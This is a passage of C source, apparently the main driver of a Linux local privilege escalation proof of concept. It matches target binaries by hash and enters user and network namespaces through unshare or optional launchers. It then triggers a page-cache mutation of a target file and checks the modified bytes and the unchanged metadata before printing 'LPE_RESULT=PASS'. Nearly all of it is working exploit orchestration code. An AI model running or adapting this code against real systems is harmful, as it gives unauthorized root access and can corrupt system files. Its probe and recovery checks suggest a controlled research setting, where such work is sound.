             name = strtok_r(NULL, ",", &save)) {
            const struct launcher_backend *b = launcher_find(name);
            any = b && launcher_installed(b);
        }
        if (!any)
            return false;
    }
    return true;
}

static int identify(const struct profile **profile, char hash[65])
{
    const struct profile *match = NULL;
    size_t matches = 0;
    for (size_t i = 0; i < compiled_profile_count; i++) {
        char candidate_hash[65];
        if (launcher_request &&
            !csv_has(compiled_profiles[i].allowed_launchers, launcher_request))
            continue;
        if (profile_matches(&compiled_profiles[i], false, candidate_hash)) {
            match = &compiled_profiles[i];
            snprintf(hash, 65, "%s", candidate_hash);
            matches++;
        }
    }
    if (matches == 1) {
        *profile = match;
        return 1;
    }
    return matches ? 2 : 0;
}

static int authorized_stage(bool probe)
{
    char hash[65], self[64];
    const struct launcher_backend *backend;
    const char *name;
    pid_t child;
    int status;

    if (inherited_profile() < 0)
        return 2;
    if (!strcmp(selected->execution_mode, "ubuntu_optional_launcher")) {
        name = getenv("SKB_POC_LAUNCHER");
        backend = launcher_find(name);
        if (!name || !backend || !csv_has(selected->allowed_launchers, name) ||
            !file_contains("/proc/self/attr/current", backend->lsm_constraint))
            return 2;
    }
    if (hash_path(selected->target_path, hash) < 0 || strcmp(hash, selected->baseline_sha256))
        return 2;
    if (strcmp(selected->execution_mode, "ubuntu_optional_launcher"))
        return probe ? 2 : netns_stage();
    if (!executable("/usr/bin/unshare", "/bin/unshare") ||
        snprintf(self, sizeof(self), "/proc/self/fd/%d", SELF_FD) >= (int)sizeof(self))
        return 2;
    child = fork();
    if (child < 0)
        return 2;
    if (child == 0) {
        const char *unshare = executable("/usr/bin/unshare", "/bin/unshare");
        execl(unshare, "unshare", "--user", "--map-root-user", "--net", self,
              probe ? "--internal-netns-probe" : "--internal-netns-transition", NULL);
        _Exit(127);
    }
    if (waitpid(child, &status, 0) < 0)
        return 2;
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0 && probe)
        puts("LAUNCHER_PROBE result=PASS control_plane=PASS trigger_attempted=0");
    return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(status);
}

static bool metadata_equal(const struct stat *a, const struct stat *b)
{
    return a->st_dev == b->st_dev && a->st_ino == b->st_ino && a->st_uid == b->st_uid &&
        a->st_gid == b->st_gid && a->st_mode == b->st_mode && a->st_size == b->st_size &&
        a->st_mtim.tv_sec == b->st_mtim.tv_sec && a->st_mtim.tv_nsec == b->st_mtim.tv_nsec &&
        a->st_ctim.tv_sec == b->st_ctim.tv_sec && a->st_ctim.tv_nsec == b->st_ctim.tv_nsec;
}

static int hash_backing_page(const struct profile *profile, char hex[65])
{
    unsigned char *page = NULL, digest[SHA256_DIGEST_LENGTH];
    off_t offset = (off_t)profile->target_offset & ~(off_t)4095;
    int fd = open(profile->target_path, O_RDONLY | O_DIRECT | O_CLOEXEC);
    ssize_t n;
    if (fd < 0 || posix_memalign((void **)&page, 4096, 4096) != 0) {
        if (fd >= 0) close(fd);
        return -1;
    }
    n = pread(fd, page, 4096, offset);
    close(fd);
    if (n != 4096) {
        free(page);
        return -1;
    }
    SHA256(page, 4096, digest);
    free(page);
    for (size_t i = 0; i < sizeof(digest); i++)
        sprintf(hex + i * 2, "%02x", digest[i]);
    hex[64] = 0;
    return 0;
}

static int run_direct_transition(void)
{
    char self[64];
    pid_t child;
    int status;
    const char *unshare = executable("/usr/bin/unshare", "/bin/unshare");
    if (!unshare || snprintf(self, sizeof(self), "/proc/self/fd/%d", SELF_FD) >= (int)sizeof(self))
        return 127;
    child = fork();
    if (child == 0) {
        execl(unshare, "unshare", "--user", "--map-root-user", "--net",
              self, "--internal-transition", NULL);
        _Exit(127);
    }
    if (child < 0 || waitpid(child, &status, 0) < 0)
        return 125;
    return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(status);
}

static int forward_main(void)
{
    const struct profile *profile;
    struct stat before, after;
    char current_hash[65], page_hash[65], self[4096], out[1024], err[1024];
    uint8_t window[40];
    int rc;

    if (identify(&profile, current_hash) != 1) {
        printf("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=ENVIRONMENT_MISMATCH\n");
        return 2;
    }
    selected = profile;
    printf("PROFILE_ID=%s\n", profile->profile_id);
    if (launcher_request &&
        (!csv_has(profile->allowed_launchers, launcher_request) ||
         strcmp(profile->execution_mode, "ubuntu_optional_launcher")))
        goto precondition_fail;
    if (!profile->enabled) {
        puts("PROFILE_STATUS=RECOVERY_VALIDATION_BLOCKED");
        goto precondition_fail;
    }
    rc = consumer(profile, out, err);
    if (rc == 0 || !strcmp(out, "0\n") || stat(profile->target_path, &before) < 0 ||
        install_fds(profile) < 0)
        goto precondition_fail;
    selected_launcher = NULL;
    if (!strcmp(profile->execution_mode, "ubuntu_optional_launcher")) {
        const char *candidates = launcher_request ? launcher_request : profile->automatic_launchers;
        char list[512], *save = NULL, *name;
        if (self_path(self) < 0)
            goto precondition_fail;
        snprintf(list, sizeof(list), "%s", candidates);
        for (name = strtok_r(list, ",", &save); name; name = strtok_r(NULL, ",", &save)) {
            const struct launcher_backend *backend = launcher_find(name);
            if (backend && launcher_installed(backend) &&
                launcher_run(backend, self, "--internal-probe", profile->distribution_suite) == 0) {
                selected_launcher = backend;
                break;
            }
        }
        if (!selected_launcher)
            goto precondition_fail;
    }
    printf("TRIGGER_ATTEMPTED=1\nRECOVERY_REQUIRED=1\nRECOVERY_STATE=PENDING\n"
           "REBOOT_REQUIRED=1\n");
    if (!strcmp(profile->recovery_mode, "snapshot_rollback")) {
        puts("RECOVERY_METHOD=VM_SNAPSHOT_ROLLBACK\n"
             "RECOVERY_COMMAND=ROLL_BACK_VM_SNAPSHOT");
    } else if (selected_launcher) {
        printf("RECOVERY_ARTIFACT=%s\nRECOVERY_SHA256=%s\n",
               profile->recovery_artifact, profile->recovery_sha256);
        printf("SELECTED_LAUNCHER=%s\nRECOVERY_COMMAND=./%s --launcher %s\n",
               selected_launcher->name, profile->recovery_artifact, selected_launcher->name);
    } else {
        printf("RECOVERY_ARTIFACT=%s\nRECOVERY_SHA256=%s\n",
               profile->recovery_artifact, profile->recovery_sha256);
        printf("RECOVERY_COMMAND=./%s\n", profile->recovery_artifact);
    }
    if (selected_launcher) {
        if (self_path(self) < 0)
            goto trigger_fail;
        rc = launcher_run(selected_launcher, self, "--internal-transition",
                          profile->distribution_suite);
    } else {
        rc = run_direct_transition();
    }
    if (rc != 0 || hash_path(profile->target_path, current_hash) < 0 ||
        strcmp(current_hash, profile->mutated_sha256) ||
        hash_backing_page(profile, page_hash) < 0 || strcmp(page_hash, profile->backing_page_sha256) ||
        pread(TARGET_FD, window, sizeof(window), (off_t)profile->target_offset - 16) != sizeof(window) ||
        memcmp(window, profile->guard_before, 16) ||
        memcmp(window + 16, profile->desired_slice, 8) ||
        memcmp(window + 24, profile->guard_after, 16) ||
        stat(profile->target_path, &after) < 0 || !metadata_equal(&before, &after) ||
        consumer(profile, out, err) != 0 || strcmp(out, "0\n") || err[0])
        goto trigger_fail;
    printf("LPE_RESULT=PASS\nFINAL_RESULT_SCOPE=LPE_ONLY\nFINAL_RESULT=PASS\nSUCCESS_MESSAGE=%s\n",
           profile->success_message);
    return 0;
trigger_fail:
    puts("LPE_RESULT=FAIL\nFINAL_RESULT_SCOPE=LPE_ONLY\nFINAL_RESULT=FAIL");
    return 1;
precondition_fail:
    puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=FAIL");
    return 3;
}

static int launcher_probe_main(const char *requested)
{
    const struct profile *profile;
    char hash[65], self[4096], list[512], *save = NULL, *name;
    int installed = 0, passed = 0, failed = 0;

    if (identify(&profile, hash) != 1 ||
        strcmp(profile->execution_mode, "ubuntu_optional_launcher")) {
        puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=ENVIRONMENT_MISMATCH");
        return 2;
    }
    selected = profile;
    printf("PROFILE_ID=%s\n", profile->profile_id);
    if (install_fds(profile) < 0 || self_path(self) < 0)
        goto fail;
    snprintf(list, sizeof(list), "%s", requested ? requested : profile->allowed_launchers);
    for (name = strtok_r(list, ",", &save); name; name = strtok_r(NULL, ",", &save)) {
        const struct launcher_backend *backend = launcher_find(name);
        int status = 127;
        int is_installed = backend && csv_has(profile->allowed_launchers, backend->name) &&
                           launcher_installed(backend);
        if (is_installed) {
            installed++;
            status = launcher_run(backend, self, "--internal-probe", profile->distribution_suite);
            if (status == 0) passed++; else failed++;
        }
        printf("LAUNCHER_CANDIDATE name=%s installed=%d probe_status=%d viable=%d trigger_attempted=0\n",
               name, is_installed, status, is_installed && status == 0);
    }
    printf("LAUNCHER_SCAN_RESULT installed=%d passed=%d failed=%d trigger_attempted=0\n",
           installed, passed, failed);
    if ((requested && passed == 1) || (!requested && installed > 0 && failed == 0)) {
        puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=PASS");
        return 0;
    }
fail:
    puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=FAIL");
    return 3;
}

static int netns_probe(void)
{
    if (inherited_profile() < 0 || nft_helper_main() != 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/route_localnet") < 0 ||
        write_one("/proc/sys/net/ipv4/conf/lo/accept_local") < 0 || network_setup() < 0)
        return 2;
    puts("LAUNCHER_CONTROL_PLANE result=PASS private_userns=1 private_netns=1 trigger_attempted=0");
    return 0;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IOLBF, 0);
    if (argc == 2) {
        if (!strcmp(argv[1], "--internal-netns-transition")) return netns_stage();
        if (!strcmp(argv[1], "--internal-netns-probe")) return netns_probe();
        if (!strcmp(argv[1], "--internal-transition")) return authorized_stage(false);
        if (!strcmp(argv[1], "--internal-probe")) return authorized_stage(true);
        if (!strcmp(argv[1], "--internal-snap-transition")) return snap_stage();
        if (!strcmp(argv[1], "--internal-snap-probe")) return snap_probe();
        if (!strcmp(argv[1], "--list-profiles")) {
            for (size_t i = 0; i < compiled_profile_count; i++)
                printf("PROFILE_ID=%s EVIDENCE_ALIASES=%s RECOVERY_ARTIFACT=%s ENABLED=%d\n",
                       compiled_profiles[i].profile_id, compiled_profiles[i].evidence_aliases,
                       compiled_profiles[i].recovery_artifact, compiled_profiles[i].enabled);
            return 0;
        }
        if (!strcmp(argv[1], "--identify")) {
            const struct profile *profile;
            char hash[65];
            if (normalize_public_capabilities() == 0 && identify(&profile, hash) == 1) {
                printf("PROFILE_ID=%s\nTRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\n",
                       profile->profile_id);
                return profile->enabled ? 0 : 3;
            }
            puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=ENVIRONMENT_MISMATCH");
            return 2;
        }
        if (!strcmp(argv[1], "--scan-launchers")) {
            if (normalize_public_capabilities() == 0)
                return launcher_probe_main(NULL);
            puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=ENVIRONMENT_MISMATCH");
            return 2;
        }
    } else if (argc == 3) {
        if (!strcmp(argv[1], "--probe-launcher")) {
            if (normalize_public_capabilities() == 0)
                return launcher_probe_main(argv[2]);
            puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=ENVIRONMENT_MISMATCH");
            return 2;
        }
        if (!strcmp(argv[1], "--launcher")) {
            launcher_request = argv[2];
            if (normalize_public_capabilities() == 0)
                return forward_main();
            puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=ENVIRONMENT_MISMATCH");
            return 2;
        }
    } else if (argc == 1) {
        if (normalize_public_capabilities() == 0)
            return forward_main();
        puts("TRIGGER_ATTEMPTED=0\nRECOVERY_REQUIRED=0\nFINAL_RESULT=ENVIRONMENT_MISMATCH");
        return 2;
    }
    fputs("invalid usage\n", stderr);
    return 64;
}
